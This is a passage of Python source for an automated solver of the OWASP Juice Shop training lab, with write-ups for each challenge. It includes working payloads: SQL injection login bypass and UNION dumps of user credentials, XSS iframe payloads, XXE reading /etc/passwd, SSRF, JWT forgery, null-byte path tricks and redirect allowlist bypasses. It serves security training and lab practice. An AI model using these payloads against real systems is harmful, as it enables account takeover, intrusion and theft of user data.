        aid = c.post("/api/Addresss", headers=ha, json={"fullName": "A", "mobileNum": "1234567890",
                     "zipCode": "12345", "streetAddress": "1 St", "city": "X", "state": "Y",
                     "country": "Z"}).json()["data"]["id"]
        cid = c.post("/api/Cards", headers=ha, json={"fullName": "A", "cardNum": "4111111111111111",
                     "expMonth": "1", "expYear": "2099"}).json()["data"]["id"]
        did = c.get("/api/Deliverys", headers=ha).json()["data"][0]["id"]
        c.post("/rest/basket/%s/checkout" % bid_a, headers=ha,
               json={"couponData": None, "orderDetails": {"paymentId": str(cid), "addressId": str(aid),
                                                          "deliveryMethodId": str(did)}})
        tok_b, _ = _reg_login(eb)
        hb = {"Authorization": "Bearer %s" % tok_b}
        ans = c.get("/rest/image-captcha", headers=hb).json().get("answer")     # captcha leaks its own answer
        c.post("/rest/user/data-export", headers=hb, json={"answer": ans, "confirmation": ""})
    except Exception:
        pass


def _profile_ssrf(c):
    """SSRF: profileImageUrlUpload fetches the attacker-supplied image URL server-side. Point it at the
    app's own /solve/challenges/server-side endpoint -- the URL regex sets abused_ssrf_bug and the
    server-side fetch of that URL (with the key) confirms the SSRF. Real server-side request forgery."""
    tok = _profile_user(c)
    if not tok:
        return
    hdr = {"Cookie": "token=%s" % tok, "Content-Type": "application/x-www-form-urlencoded"}
    ssrf = "http://localhost:3000/solve/challenges/server-side?key=%s" % _SSTI_KEY
    try:
        c.post("/profile/image/url", data={"imageUrl": ssrf}, headers=hdr)
        c.get("/solve/challenges/server-side", params={"key": _SSTI_KEY}, headers={"Cookie": "token=%s" % tok})
    except Exception:
        pass


def solve(base_url: str) -> dict:
    """Run the full Juice Shop lab solver against a live instance; report scoreboard delta."""
    try:
        import httpx
        import browser_engine
    except Exception:
        return {"error": "httpx unavailable"}
    base = base_url.rstrip("/")
    try:
        c = browser_engine.rate_limited_sync_client(
            httpx, base_url=base, follow_redirects=False, timeout=20,
            headers={"User-Agent": "apolaki-labmode"})
    except Exception as e:
        return {"error": str(e)}
    try:
        before = _board(c)
        admin = _login(c, _ADMIN_SQLI, "x")
        AH = {"Authorization": "Bearer %s" % admin.get("token")} if admin.get("token") else {}
        for step in (_sqli_logins, _known_cred_logins, _known_login_challenges, _registrations,
                     _resets, _beacon_visits, _uploads, _basket_manipulate, _deluxe_fraud,
                     _socket_xss, _ephemeral_accountant, _retrieve_blueprint, _checkout_orders,
                     _forged_coupon, _two_factor, _feedback_patterns, _csrf, _change_bender,
                     _multiple_likes, _reflected_and_nosql, _api_and_header_xss, _serverside_xss,
                     _allowlist_bypass, _privacy_and_jwt, _imaginary,
                     _product_tampering, _password_hash_leak, _expired_coupon,
                     _ftp_harvest, _sqli_union_extract, _view_basket, _unsigned_jwt, _local_file_read,
                     _arbitrary_file_write, _ghost_login, _video_xss,
                     _profile_ssti, _csp_bypass, _client_xss_protection, _profile_ssrf, _gdpr_data_theft):
            try:
                step(c)
            except Exception:
                pass
        for step in (_feedback, _reviews):
            try:
                step(c, AH)
            except Exception:
                pass
        _browser_solves(base)
        after = _board(c)
        return {"lab": "juiceshop", "before": len(before), "after": len(after),
                "total": 113, "percent": round(100 * len(after) / 113, 1),
                "newly_solved": sorted(after - before)}
    except Exception as e:
        return {"lab": "juiceshop", "error": str(e)}
    finally:
        c.close()


# ---------------------------------------------------------------------------------------------
# Conquest knowledge view (READ-ONLY): annotate the live scoreboard with the technique behind
# each solve. No exploitation happens here -- solve() does the work; this narrates it for the UI.
# ---------------------------------------------------------------------------------------------

SOLVE_MANIFEST = {
    # Injection
    "Login Admin": "SQLi auth bypass -- ' or 1=1--",
    "Login Jim": "SQLi login by email + comment truncation",
    "Login Bender": "SQLi login -- bender@juice-sh.op'--",
    "Database Schema": "UNION SELECT dumps sqlite_master",
    "User Credentials": "UNION SELECT exfiltrates the Users table",
    "Christmas Special": "SQLi reveals a soft-deleted product, then order it",
    "Ephemeral Accountant": "UNION forges a phantom accountant row to log in as",
    "NoSQL Manipulation": "NoSQL operator injection ($ne) on review update",
    "NoSQL Exfiltration": "Boolean NoSQL exfil via track-order ('||true||')",
    "SSTi": "Server-side template injection -- profile username #{7*7} eval'd server-side",
    "CSP Bypass": "profileImage injects script-src 'unsafe-inline'; fromCharCode username bypasses the legacy sanitizer",
    "Client-side XSS Protection": "Persisted XSS -- register a user whose email is an <iframe javascript:> payload",
    "SSRF": "profileImage URL points the server-side fetch at its own /solve/challenges/server-side",
    "Mass Dispel": "Socket emit verifyCloseNotificationsChallenge with an array of length > 1",
    "GDPR Data Theft": "Vowel-mask collision -- export as a user whose masked email matches another's orders",
    # Cryptographic Issues
    "Weird Crypto": "Name an insecure cipher (z85/MD5) in feedback",
    "Nested Easter Egg": "Decode the nested route and visit it",
    "Premium Paywall": "Decrypt the hidden paywall URL and visit it",
    "Forged Coupon": "z85 base85 coupon forgery -- salt-free 99% off",
    "Imaginary Challenge": "hashids continue-code forgery claiming #999",
    # Broken Authentication
    "Password Strength": "Weak default admin password -- admin123",
    "Reset Jim's Password": "Security-answer reset -- Samuel",
    "Bjoern's Favorite Pet": "Security-answer reset -- Zaya",
    "GDPR Data Erasure": "File a GDPR erasure request as the victim",
    "Login Bjoern": "Known-credential / OAuth account takeover",
    "Reset Bender's Password": "Security-answer reset -- Stop'n'Drop",
    "Change Bender's Password": "Change password with no current-password param",
    "Reset Bjoern's Password": "Security-answer reset -- West-2082",
    "Two Factor Authentication": "Native TOTP (HMAC-SHA1) to clear the 2FA gate",
    # XSS
    "DOM XSS": "iframe payload in the search field (socket oracle)",
    "Bonus Payload": "The SoundCloud iframe bonus payload",
    "Reflected XSS": "Reflected iframe in the track-order id",
    "API-only XSS": "Stored iframe pushed through the product API",
    "HTTP-Header XSS": "iframe smuggled via the True-Client-IP header",
    "Server-side XSS Protection": "sanitize-html 1.4.2 bypass -- <<script>",
    # Broken Access Control
    "Web3 Sandbox": "Force-browse the hidden web3 sandbox route",
    "Admin Section": "Force-browse to /administration",
    "View Basket": "IDOR -- read another user's basket by id",
    "Five-Star Feedback": "Admin-delete the lone 5-star feedback",
    "Manipulate Basket": "Inject a BasketItem into a foreign basket",
    "Forged Feedback": "Forge feedback authorship via the UserId param",
    "Forged Review": "Forge a review's author via JSON param",
    "CSRF": "Cross-origin profile POST with the cookie token",
    "Easter Egg": "Force-browse the hidden /ftp easter egg",
    # Vulnerable Components
    "Legacy Typosquatting": "Report the typosquat package -- epilogue-js",
    "Vulnerable Library": "Report the vulnerable lib -- sanitize-html 1.4.2",
    "Frontend Typosquatting": "Report the typosquatted frontend dependency",
    "Supply Chain Attack": "Cite the eslint-scope#39 incident",
    "Unsigned JWT": "Forge a token with alg:none",
    "Forged Signed JWT": "HS256 key-confusion -- server pubkey as HMAC secret",
    # Sensitive Data Exposure
    "Confidential Document": "Fetch /ftp/acquisitions.md",
    "Exposed credentials": "Credentials hard-coded in the frontend JS bundle",
    "Login MC SafeSearch": "Known password from the video -- Mr. N00dles",
    "Meta Geo Stalking": "OSINT -- photo EXIF geo, then reset answer",
    "Visual Geo Stalking": "OSINT -- landmark in image, then reset answer",
    "Login Amy": "Known password -- Kif's 93.5-quintillion secret",
    "Forgotten Developer Backup": "Null-byte fetch of the dev backup in /ftp",
    "Forgotten Sales Backup": "Null-byte fetch of the sales backup in /ftp",
    "Leaked Unsafe Product": "Name the leaked unsafe product -- hueteroneel",
    "Reset Uvogin's Password": "Security-answer reset -- Silence of the Lambs",
    "Email Leak": "JSONP callback on /whoami leaks the email",
    "Leaked API Key": "Report the leaked API key found in feedback",
    "Retrieve Blueprint": "Locate the leaked product 3-D blueprint file",
    # Improper Input Validation
    "Missing Encoding": "Fetch the broken-encoded photo URL directly",
    "Repetitive Registration": "Register with a mismatched repeat password",
    "Zero Stars": "Submit a 0-star rating (client-side bypass)",
    "Empty User Registration": "Register with empty email and password",
    "Admin Registration": "Register with role:'admin' in the body",
    "Deluxe Fraud": "Upgrade to deluxe membership without paying",
    "Payback Time": "Negative-quantity basket item -> negative total",
    "Upload Size": "Bypass the client size cap to upload >100 KB",
    "Upload Type": "Upload a disallowed file type",
    "Poison Null Byte": "Poison null byte in the path -- ...md%2500",
    # XXE
    "XXE Data Access": "External entity in a B2B XML upload reads a file",
    # Security Misconfiguration
    "Error Handling": "Trigger a verbose stack trace",
    "Deprecated Interface": "Use the deprecated B2B XML interface",
    "Cross-Site Imaging": "SVG injection paired with an allowlisted redirect",
    "Login Support Team": "Log in with support creds mined from the logs",
    # Broken Anti Automation
    "CAPTCHA Bypass": "Replay one captcha across a burst of feedback",
    "Extra Language": "Fetch the incomplete translation -- tlh_AA.json",
    "Reset Morty's Password": "Rate-limited reset -- answer 5N0wb41L",
    "Multiple Likes": "Race condition -- concurrent review-like requests",
    # Observability Failures
    "Exposed Metrics": "Scrape the open /metrics Prometheus endpoint",
    "Access Log": "Fetch the exposed dated access log",
    "Misplaced Signature File": "Locate the misplaced code-signature file in /ftp",
    "Leaked Access Logs": "Mine the leaked access log for credentials",
    # Unvalidated Redirects
    "Outdated Allowlist": "Open redirect to an allowlisted bitcoin URL",
    "Allowlist Bypass": "Allowlist bypass by smuggling the URL in a param",
    # Security through Obscurity
    "Privacy Policy Inspection": "Force-browse the hidden privacy route",
    "Steganography": "Extract the hidden pass from an image, report it",
    "Blockchain Hype": "Locate the hidden blockchain-hype page",
    # Miscellaneous
    "Score Board": "Discover the hidden score board",
    "Privacy Policy": "Visit the privacy policy page",
    "Security Policy": "Fetch /.well-known/security.txt",
    "Security Advisory": "Locate the published security advisory",
    # Frontier challenges cracked after launch (source-driven)
    "Product Tampering": "Overwrite O-Saft's link href via the unguarded PUT /api/Products",
    "Password Hash Leak": "Leak the password hash via /whoami?fields=password",
    "Expired Coupon": "Redeem an expired campaign coupon via couponData",
}

# The full write-up per challenge -- the "adventure" narrative, readable in the Conquest tab.
SOLVE_DETAIL = {
    # Injection
    "Login Admin": "POST /rest/user/login with email `' or 1=1--` and any password. The comment kills the password check and the query returns the first Users row -- the admin -- handing back the admin JWT.",
    "Login Jim": "POST /rest/user/login with email `jim@juice-sh.op'--`. The trailing SQL comment truncates the password condition, so the login succeeds as Jim.",
    "Login Bender": "Same comment-truncation trick with email `bender@juice-sh.op'--` -> authenticated as Bender without his password.",
    "Database Schema": "On /rest/products/search, break out with `'))` and UNION SELECT from sqlite_master. The response leaks the DDL of every table in the database.",
    "User Credentials": "A UNION SELECT crafted to match the 13-column Users table dumps every user's email and password hash straight into the product-search results.",
    "Christmas Special": "Reveal the soft-deleted Christmas product with search `')) --` (it's id 10), add that hidden product to the basket, then complete checkout.",
    "Ephemeral Accountant": "Log in with a UNION SELECT that fabricates an 'accountant' user row (acc0unt4nt@juice-sh.op) that was never stored -- you end up authenticated as an account that doesn't exist.",
    "NoSQL Manipulation": "PATCH /rest/products/reviews with `{ id: { $ne: -1 } }`. The Mongo operator matches every review, so one request rewrites them all.",
    "NoSQL Exfiltration": "GET /rest/track-order/`'||true||'`. The always-true NoSQL expression returns every order instead of just yours (needs safetyMode off).",
    "SSTi": "The /profile page runs `eval()` on any username matching `#{...}`. Cookie-auth POST /profile (urlencoded) sets your username to `#{7*7}`, GET /profile evaluates it server-side and flips `abused_ssti_bug`, then GET /solve/challenges/server-side?key=... confirms it. The auth is the cookie token, NOT the Bearer header -- that mismatch is why naive attempts bound username=None.",
    "SSRF": "POST /profile/image/url with an imageUrl pointing at the app's OWN `http://localhost:3000/solve/challenges/server-side?key=...`. The server fetches that URL (the SSRF), the URL regex sets `abused_ssrf_bug`, and the server-side fetch with the key confirms the challenge.",
    "Mass Dispel": "Open a Socket.IO handshake and emit `verifyCloseNotificationsChallenge` with an array of length > 1 (e.g. [1,2]). The server solves when it receives a close-notifications event carrying more than one notification id.",
    "GDPR Data Theft": "The data export fetches orders by the VOWEL-MASKED email (email.replace(/[aeiou]/gi,'*')) but checks the orderId prefix against hash(REAL email). Place an order as user A, then export as a fresh user B whose email masks identically to A's (only a leading vowel differs -> same mask, different hash) -- B's export leaks and steals A's orders. The export's image-captcha conveniently returns its own answer.",
    "CSP Bypass": "Two steps on your own profile: POST /profile/image/url a URL that fails to fetch and contains `;script-src 'unsafe-inline'` (stored raw into the CSP), then set the username to a `<script>alert(`xss`)</script>` payload. The username setter runs the legacy sanitizer (strips `<tag>`), so the payload is delivered as `#{String.fromCharCode(...)}` -- no literal `<` to strip -- which the profile page evals to the script at render time.",
    "Client-side XSS Protection": "The User model's email setter solves the challenge when the email contains `<iframe src=\"javascript:alert(`xss`)\">`. Register a new user (POST /api/Users) with exactly that email -- persisted XSS that the client-side sanitizer was supposed to catch.",
    # Cryptographic Issues
    "Weird Crypto": "POST a feedback that names a broken/insecure scheme (z85, MD5, base64...). The server's feedback-pattern check fires on the keyword.",
    "Nested Easter Egg": "Decode the base64/ROT13 breadcrumb and GET /the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg.",
    "Premium Paywall": "Decrypt the encrypted breadcrumb string to recover the long hidden paywall URL, then GET it.",
    "Forged Coupon": "The coupon codec is z85/base85 with NO salt. Encode `<MMMYY>-99` yourself, PUT it to /rest/basket/{bid}/coupon/{code}, and checkout -- 99% off.",
    "Imaginary Challenge": "Forge a hashids continue-code (salt `this is my salt`, minLength 60) that encodes challenge #999, then PUT /rest/continue-code/apply/{code}. Beats the troll that has no real solve path.",
    # Broken Authentication
    "Password Strength": "POST /rest/user/login admin@juice-sh.op / admin123. The default admin password is trivially weak.",
    "Reset Jim's Password": "POST /rest/user/reset-password with Jim's known security answer `Samuel` and a new password.",
    "Bjoern's Favorite Pet": "Reset bjoern.kimminich@gmail.com using the security answer `Zaya`.",
    "GDPR Data Erasure": "While authenticated, POST /rest/user/erasure-request -> the account-erasure flow itself is the challenge.",
    "Login Bjoern": "Take over Bjoern's internal OAuth account (bjoern@owasp.org) using the derivable credential.",
    "Reset Bender's Password": "Reset bender@juice-sh.op with the security answer `Stop'n'Drop`.",
    "Change Bender's Password": "SQLi-login as Bender, then GET /rest/user/change-password?new=slurmCl4ssic&repeat=slurmCl4ssic -- the endpoint never checks the CURRENT password.",
    "Reset Bjoern's Password": "Reset bjoern@juice-sh.op with the security answer `West-2082`.",
    "Two Factor Authentication": "Log in wurstbrot@juice-sh.op, compute the 6-digit TOTP from the leaked secret (native HMAC-SHA1, 30s window), and POST /rest/2fa/verify with the tmpToken.",
    # XSS
    "DOM XSS": "Type `<iframe src=\"javascript:alert(`xss`)\">` into the search box. filterTable() emits the socket event the oracle listens for.",
    "Bonus Payload": "Use the specific SoundCloud iframe bonus payload in search -> the xssBonus event fires alongside DOM XSS.",
    "Reflected XSS": "GET /rest/track-order/`<iframe src=\"javascript:alert(`xss`)\">`; the id is reflected unescaped into the tracking view (needs safetyMode off).",
    "API-only XSS": "Create/patch a product through /api/Products with the iframe payload in `description`. The API path stores it without the sanitisation the UI applies.",
    "HTTP-Header XSS": "GET /rest/saveLoginIp with header `True-Client-IP: <iframe...>`. The header value is reflected unescaped.",
    "Server-side XSS Protection": "POST feedback `<<script>Foo</script>iframe src=...>`. sanitize-html 1.4.2 strips the inner tag in a single pass, leaving a live one behind.",
    # Broken Access Control
    "Web3 Sandbox": "Force-browse the hidden web3 sandbox route; a padding-pixel beacon confirms the visit.",
    "Admin Section": "Navigate straight to /#/administration -- the admin view is only hidden, not access-controlled, client-side.",
    "View Basket": "GET /rest/basket/{someone-else's-id} with your own token -> you read a basket that isn't yours (classic IDOR).",
    "Five-Star Feedback": "As admin, DELETE /api/Feedbacks/{id} for the single remaining 5-star feedback.",
    "Manipulate Basket": "PUT /api/BasketItems/{id} with a BasketId that belongs to another user -> you edit their basket.",
    "Forged Feedback": "POST /api/Feedbacks with a UserId that isn't yours -> the feedback is attributed to someone else.",
    "Forged Review": "PATCH a product review and set the author field to another user's identity.",
    "CSRF": "POST /profile using the cookie token, Origin http://htmledit.squarefree.com, and a username change -- a cross-site request mutates your profile.",
    "Easter Egg": "Force-browse /ftp/eastere.gg via the browsable FTP folder (null-byte trick gets past the extension filter).",
    # Vulnerable Components
    "Legacy Typosquatting": "POST feedback mentioning `epilogue-js`, the malicious typosquat of the `epilogue` package.",
    "Vulnerable Library": "POST feedback naming `sanitize-html` at version `1.4.2`, a release with a known bypass.",
    "Frontend Typosquatting": "POST feedback naming the typosquatted Angular cookie dependency shipped in the frontend.",
    "Supply Chain Attack": "POST feedback referencing the eslint-scope npm compromise (github.com/eslint/eslint-scope/issues/39).",
    "Unsigned JWT": "Present a JWT whose header says alg:none (no signature) -- the server still trusts it.",
    "Forged Signed JWT": "Fetch /encryptionkeys/jwt.pub and sign an HS256 token using that RSA PUBLIC key as the HMAC secret (data for rsa_lord@juice-sh.op). Key-confusion between RS256 and HS256.",
    # Sensitive Data Exposure
    "Confidential Document": "GET /ftp/acquisitions.md -- a confidential document sitting in the browsable FTP folder.",
    "Exposed credentials": "Search the shipped frontend JS bundle for the hard-coded testing credentials.",
    "Login MC SafeSearch": "Login mc.safesearch@juice-sh.op / `Mr. N00dles` -- the password is spelled out in the referenced music video.",
    "Meta Geo Stalking": "Read the EXIF geotag on the target's uploaded photo to answer their reset question (Daniel Boone National Forest) and reset john@.",
    "Visual Geo Stalking": "Identify the landmark visible in the target's photo to answer their reset question (ITsec) and reset emma@.",
    "Login Amy": "Login amy@juice-sh.op with Kif's absurdly long password -- the hint jokes it would take 93.5 quintillion years to crack.",
    "Forgotten Developer Backup": "GET /ftp/package.json.bak%2500.md -- the null byte makes the filter see a .md while the server reads the .bak.",
    "Forgotten Sales Backup": "GET /ftp/coupons_2013.md.bak%2500.md -- same null-byte bypass on the old sales/coupons backup.",
    "Leaked Unsafe Product": "POST feedback naming the leaked unsafe product (hueteroneel / eurogium edule) from the tampered product data.",
    "Reset Uvogin's Password": "Reset Uvogin with the security answer `Silence of the Lambs`.",
    "Email Leak": "GET /rest/user/whoami?callback=x -- the JSONP callback wraps the response so the email can be read cross-origin.",
    "Leaked API Key": "POST feedback containing the API key that was left in the source, and the pattern check solves it.",
    "Retrieve Blueprint": "GET /assets/public/images/products/JuiceShop.stl -- the leaked 3-D-print blueprint of the product.",
    # Improper Input Validation
    "Missing Encoding": "GET the mis-encoded product photo URL directly; the filename's broken encoding is the whole point.",
    "Repetitive Registration": "POST /api/Users with passwordRepeat different from password -- the 'passwords must match' rule only lived in the UI.",
    "Zero Stars": "POST /api/Feedbacks with rating 0 -- the 'no zero-star' rule is client-side only.",
    "Empty User Registration": "POST /api/Users with an empty email AND empty password -- the required-field checks are client-side.",
    "Admin Registration": "POST /api/Users with `role: \"admin\"` in the body -> self-assign the admin role at signup.",
    "Deluxe Fraud": "POST /rest/deluxe-membership (authenticated) with a paymentMode that isn't a real card/wallet -> deluxe status without paying.",
    "Payback Time": "Put a NEGATIVE quantity on a basket item so the order total drops below zero at checkout -- the shop 'pays you'.",
    "Upload Size": "Upload a file larger than the 100 KB limit by bypassing the client-side size guard.",
    "Upload Type": "Upload a file whose extension isn't in the pdf/xml/zip/yml allowlist.",
    "Poison Null Byte": "Append `%2500.md` to a restricted path -- the null byte terminates the string for the extension check but not for the file read.",
    # XXE
    "XXE Data Access": "POST an XML file to /file-upload with a SINGLE external entity resolving `file:///etc/passwd`. Keeping it non-recursive avoids tripping the XXE-DoS variant.",
    # Security Misconfiguration
    "Error Handling": "Send malformed input that the server doesn't catch -> the verbose error page leaks stack traces and internals.",
    "Deprecated Interface": "POST an XML file to the deprecated B2B /file-upload interface (it answers 410 Gone but the attempt solves the challenge).",
    "Cross-Site Imaging": "Emit the SVG-injection socket event whose data matches `../../../redirect?to=https://cataas.com/cat` and contains an allowlisted github.com/juice-shop URL so the redirect passes.",
    "Login Support Team": "Login support@juice-sh.op with the strong password recovered from the leaked access logs.",
    # Broken Anti Automation
    "CAPTCHA Bypass": "Fetch one captcha, then fire a burst of feedback submissions reusing that same answer before the captcha id rotates.",
    "Extra Language": "GET /assets/i18n/tlh_AA.json -- the incomplete Klingon translation file shouldn't be shippable.",
    "Reset Morty's Password": "Reset morty@juice-sh.op with the documented answer `5N0wb41L` (a single known value, not a brute-force) despite the reset rate-limit.",
    "Multiple Likes": "Fire concurrent like requests at one review so the race between check and write lets a single user like it multiple times.",
    # Observability Failures
    "Exposed Metrics": "GET /metrics -- the Prometheus metrics endpoint is exposed to anyone.",
    "Access Log": "GET /support/logs/access.log.<date> -- the raw server access log is served over the web.",
    "Misplaced Signature File": "Find the code-signing signature file accidentally left in the browsable /ftp folder.",
    "Leaked Access Logs": "Download the exposed access log and mine it for the credentials/tokens captured in the request lines.",
    # Unvalidated Redirects
    "Outdated Allowlist": "GET /redirect?to=https://blockchain.info/address/1AbKfg... -- a redirect target that's still allowlisted but shouldn't be.",
    "Allowlist Bypass": "GET /redirect?to=http://evil.example/?x=https://github.com/juice-shop/juice-shop -- smuggle the allowlisted URL as a query param so the naive substring check passes.",
    # Security through Obscurity
    "Privacy Policy Inspection": "Force-browse /we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility -- hidden, not protected.",
    "Steganography": "Extract the passphrase (`pickle rick`) hidden in the steganographic image and report it via feedback.",
    "Blockchain Hype": "Locate the hidden blockchain-hype page; a padding-pixel beacon confirms the visit.",
    # Miscellaneous
    "Score Board": "Discover the hidden /#/score-board route -- the very first challenge.",
    "Privacy Policy": "Visit /#/privacy-security/privacy-policy.",
    "Security Policy": "GET /.well-known/security.txt -- the standard security-contact file.",
    "Security Advisory": "Locate the published security advisory / CSAF document referenced by the app.",
    # Frontier challenges cracked after launch (source-driven)
    "Product Tampering": "PUT /api/Products/{osaft-id} isn't behind the auth guard, so overwrite the O-Saft product's description until its link reads <a href=\"https://owasp.slack.com\" target=\"_blank\"> and no longer contains the original owasp.org URL.",
    "Password Hash Leak": "GET /rest/user/whoami?fields=id,email,password with the cookie token. The handler copies any requested field straight off the user record, so it hands back the logged-in user's password hash (the admin's is md5 of admin123).",
    "Expired Coupon": "POST /rest/basket/{bid}/checkout with couponData = base64('WMNSDY2019-1551999600000'). Every built-in campaign coupon's validOn date is in the past, so the expired Women's-Day-2019 code (75% off) still redeems.",
}

# Why the remaining challenges are not taken -- the honest accounting behind the ceiling.
_REMAINING_BUCKET = {
    # DoS -- never fired (they intentionally degrade/crash the service)
    "NoSQL DoS": "dos", "Blocked RCE DoS": "dos", "Memory Bomb": "dos",
    "Successful RCE DoS": "dos", "XXE DoS": "dos",
    # Not hosted in this build -- needs an LLM key or a live chain
    "Chatbot Prompt Injection": "not_hosted", "Greedy Chatbot Manipulation": "not_hosted",
    "System Prompt Extraction": "not_hosted", "AI Debugging": "not_hosted",
    "NFT Takeover": "not_hosted", "Mint the Honey Pot": "not_hosted",
    "Wallet Depletion": "not_hosted", "Mass Dispel": "not_hosted",
    # Open frontier -- CLEARED: every reachable challenge is now solved (100% of reachable). The
    # remaining unsolved are all off-limits below (DoS / chatbot-needs-LLM / web3-needs-chain).
}

SIGNATURE = [
    {"title": "Real-time solve injection",
     "blurb": "Hand-rolled a Socket.IO (engine.io v4) polling client to emit the exact events the oracle listens for.",
     "tag": "socket.emit(verifyLocalXssChallenge)"},
    {"title": "The phantom accountant",
     "blurb": "A UNION SELECT conjured a user row that never existed in the database, then logged in as it.",
     "tag": "' UNION SELECT ... 'accountant' ... --"},
    {"title": "JWT key-confusion",
     "blurb": "Signed a forged admin token with the server's own RSA public key used as an HMAC secret.",
     "tag": "HS256( jwt.pub )"},
    {"title": "A coupon from thin air",
     "blurb": "Reversed the z85/base85 coupon scheme and minted a salt-free 99%-off code.",
     "tag": "z85.encode(MMMYY-99)"},
    {"title": "Beat the troll",
     "blurb": "Cracked the Imaginary Challenge by forging a hashids continue-code claiming challenge #999.",
     "tag": "hashids('this is my salt',60) #999"},
    {"title": "Native 2FA, no library",
     "blurb": "Computed the TOTP codes straight from the raw secret with hand-rolled HMAC-SHA1.",
     "tag": "HMAC-SHA1(secret, t/30)"},
]


def conquest(base_url: str) -> dict:
    """Read-only knowledge view: merge the live Juice Shop scoreboard with SOLVE_MANIFEST so the UI
    can show every solved challenge and the technique behind it. Performs NO exploitation."""
    try:
        import httpx
        import browser_engine
    except Exception:
        return {"error": "httpx unavailable"}
    base = base_url.rstrip("/")
    try:
        c = browser_engine.rate_limited_sync_client(
            httpx, base_url=base, timeout=15, headers={"User-Agent": "apolaki-labmode"})
    except Exception as e:
        return {"error": str(e)}
    try:
        rows = c.get("/api/Challenges/").json().get("data", [])
    except Exception as e:
        return {"error": str(e)}
    finally:
        c.close()
    total = len(rows) or 113
    solved = [r for r in rows if r.get("solved")]
    grouped = {}
    for r in solved:
        grouped.setdefault(r.get("category", "Other"), []).append({
            "name": r.get("name"), "difficulty": r.get("difficulty", 0),
            "technique": SOLVE_MANIFEST.get(r.get("name"), ""),
            "detail": SOLVE_DETAIL.get(r.get("name"), "")})
    categories = []
    for cat in sorted(grouped, key=lambda k: (-len(grouped[k]), k)):
        items = sorted(grouped[cat], key=lambda x: (x["difficulty"], x["name"]))
        categories.append({"category": cat, "count": len(items), "items": items})
    remaining = []
    for r in rows:
        if r.get("solved"):
            continue
        remaining.append({"name": r.get("name"), "category": r.get("category", "Other"),
                          "difficulty": r.get("difficulty", 0),
                          "bucket": _REMAINING_BUCKET.get(r.get("name"), "frontier")})
    remaining.sort(key=lambda x: (x["bucket"], x["category"], x["difficulty"]))
    n = len(solved)
    gated = sum(1 for x in remaining if x["bucket"] in ("dos", "not_hosted"))
    reachable = max(1, total - gated)
    return {"lab": "juiceshop", "solved": n, "total": total,
            "percent": round(100 * n / max(1, total), 1),
            "reachable": reachable, "reachable_percent": round(100 * n / reachable, 1),
            "categories": categories, "remaining": remaining, "signature": SIGNATURE}
